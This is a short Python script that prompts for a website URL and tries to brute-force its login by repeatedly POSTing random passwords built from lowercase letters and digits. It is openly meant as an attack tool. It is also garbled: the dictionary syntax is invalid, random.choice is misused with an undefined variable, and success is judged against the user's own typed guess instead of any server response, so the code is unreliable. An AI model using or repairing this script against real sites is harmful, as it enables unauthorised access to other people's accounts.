import random
import string
import pyautogui
import requests

chars='abcdefghijklmnopqrstuvwxyz1234567890'
chars_list=list(chars)

url=input('what website you wanna brute force : ')
guess_the_password=pyautogui.password('Take A Guess To The Password > ')

data={
username:''
password=guess_the_password
}
requests.post(url, data=data)

guess_password=""

while(guess_password!=guess_the_password):
    guess_password=random.choice(chars_list, k=len(password))

    data={
    username:''
    password=guess_password
    }
    requests.post(url, data=data)
    print("<========="+ str(guess_password) + "=========>")

    if(guess_password==True):
        print('Found the password it is '+"".join(guess_password))
        break
